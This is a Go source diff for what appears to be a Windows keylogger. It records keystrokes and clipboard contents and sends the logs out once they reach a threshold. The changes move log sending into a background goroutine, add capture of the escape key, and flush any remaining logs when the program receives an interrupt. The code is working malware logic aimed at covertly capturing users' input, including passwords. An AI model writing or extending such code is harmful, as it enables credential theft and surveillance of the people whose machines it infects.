@@ -13,6 +13,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 	"net"
 	"os"
+	"os/signal"
 	"runtime"
 	"time"
 )
@@ -63,10 +64,17 @@ func main() {
 	go listenClipboard()
 	// Start a goroutine to listen keyboard.
 	go listenKeyboard()
-	// Auto send.
-	for {
-		// When have logged to the thresh, send and clear the recorded logs.
-		if len(keyLogs) >= MaxLog {
+	// Start a goroutine to send logs.
+	go autoSend()
+	// Make a channel for receiving system signal.
+	c := make(chan os.Signal)
+	// Detect interrupt (ctrl+C) signal.
+	signal.Notify(c, os.Interrupt)
+	// Block until received interrupt signal.
+	select {
+	case <-c:
+		// Send the residual logs.
+		if len(keyLogs) > 0 {
 			sendLogs()
 		}
 	}
@@ -130,6 +138,8 @@ func listenKeyboard() {
 				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "backspace"))
 			case '\t':
 				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "tab"))
+			case rune(27):
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "escape"))
 			default:
 				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
 				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
@@ -144,6 +154,16 @@ func listenKeyboard() {
 					}
 				}
 			}
+		}
+	}
+}
+
+// autoSend detects the length of logs and determines to send.
+func autoSend() {
+	for {
+		// When have logged to the thresh, send and clear the recorded logs.
+		if len(keyLogs) >= MaxLog {
+			sendLogs()
 		}
 	}
 }
